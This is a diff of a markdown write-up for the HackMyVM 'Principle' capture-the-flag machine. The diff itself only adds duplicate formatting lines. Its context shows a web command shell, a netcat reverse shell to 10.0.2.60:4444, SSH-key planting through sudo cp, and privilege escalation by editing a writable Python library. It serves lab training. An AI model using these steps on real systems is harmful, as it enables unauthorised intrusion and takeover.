@@ -29,6 +29,7 @@ PORT   STATE SERVICE VERSION
 MAC Address: 08:00:27:5A:FC:3E (Oracle VirtualBox virtual NIC)
 ```
 {: .nolineno}
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -68,6 +69,7 @@ Maybe that is why I am alone in this world?
 The answer is here:
 -.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now with cyberchef Tool I get the morse code encoded text →
@@ -110,6 +112,7 @@ hellfire                [Status: 200, Size: 1659, Words: 688, Lines: 52, Duratio
 :: Progress: [114441/114441] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
 ```
 {: .nolineno}
+{: .nolineno}
 
 `hellfire.t4l0s.hmv` lets see →
 
@@ -137,6 +140,7 @@ Now lets load this payload file now →
 http://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=id
 ```
 {: .nolineno}
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Principle/Untitled%2012.png)
 
@@ -145,6 +149,7 @@ Lets get reverse shell now →
 ```bash
 http://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=nc%20-e%20/bin/bash%2010.0.2.60%204444
 ```
+{: .nolineno}
 {: .nolineno}
 
 In response to that I got the reverse shell →
@@ -163,6 +168,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@principle:~/hellfire.t4l0s.hmv/archivos$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets dig deeper for root access →
@@ -186,6 +192,7 @@ bash-5.2$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/newgrp
 bash-5.2$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I used this command and got the access to talos user directories →
@@ -218,6 +225,7 @@ The tool I left you is still your ally. Good luck to you.
 $
 ```
 {: .nolineno}
+{: .nolineno}
 
 From `note.txt` I created a god names file that will search all the files containing that name →
 
@@ -228,6 +236,7 @@ for i in names :
         print('File Containing ' +i+' god name are : ')
         os.system('find / -type f 2>/dev/null | grep -i '+i)
 ```
+{: .nolineno}
 {: .nolineno}
 
 I got this output now →
@@ -256,6 +265,7 @@ File Containing Dioniso god name are :
 bash-5.2$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I accessed this file `/etc/selinux/Afrodita.key` →
 
@@ -269,6 +279,7 @@ REMEMBER: You need the access key and open the door. Anyway, he has a bad memory
 en at home.
 bash-5.2$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets use this password →
@@ -291,6 +302,7 @@ User talos may run the following commands on principle:
     (elohim) NOPASSWD: /bin/cp
 talos@principle:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I tried to replace the shadow or passwd file but no luck as it is done from elohim user privileegs I think I have to include the attackers ssh keys inside the elohim `.ssh` directory to get the shell →
@@ -333,6 +345,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCrXvdrOqD8zFEl8IyJWB2gaah+PWtpRItU0+764Xz
 
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets transfer these 2 files into victim machine and put it in there location →
 
@@ -364,6 +377,7 @@ talos@principle:/tmp$ chmod 600 id_rsa
 talos@principle:/tmp$ sudo -u elohim cp authorized_keys /home/gehenna/.ssh/authorized_keys
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I looked into the network connection and I got one internal connection for ssh →
 
@@ -385,6 +399,7 @@ bash: /usr/bin/ssh: Permission denied
 talos@principle:/tmp$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now on Attackers machine I transfered the ssh executable to the victim machine →
 
@@ -396,6 +411,7 @@ ssh: /usr/bin/ssh /etc/ssh /usr/share/man/man1/ssh.1.gz
 ┌──(kali㉿kali)-[~/Downloads/HackMyVM/Principle]
 └─$ cp /usr/bin/ssh .
 ```
+{: .nolineno}
 {: .nolineno}
 
 through wget and now its time to get elohim shell →
@@ -422,6 +438,7 @@ usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
            [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
            destination [command [argument ...]]
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now elohim SSH time →
@@ -490,6 +507,7 @@ FLAGFLAGFLAG
 elohim@principle:~$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now lets get to root →
 
@@ -508,6 +526,7 @@ elohim@principle:~$ id
 uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
 elohim@principle:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 Lets see `reviewer.py` file →
@@ -551,6 +570,7 @@ enviar_mensaje_usuarios_conectados()
 elohim@principle:~$
 ```
 {: .nolineno}
+{: .nolineno}
 
 Lets see the permissions of there libraries →
 
@@ -566,6 +586,7 @@ elohim@principle:~$ ls -al /usr/lib/python3.11/os.py
 -rw-r--r-- 1 root root 39504 Mar 13  2023 /usr/lib/python3.11/os.py
 elohim@principle:~$
 ```
+{: .nolineno}
 {: .nolineno}
 
 I can see I have write permission on `subprocess.py` file so lets add our own os module system commmands →
@@ -625,6 +646,7 @@ Broadcast message from root@principle (somewhere) (Tue Oct 10 02:40:01 2023):
                                                                                
 I have detected an intruder, stealing accounts: elohim
 ```
+{: .nolineno}
 {: .nolineno}
 
 I am root now !!
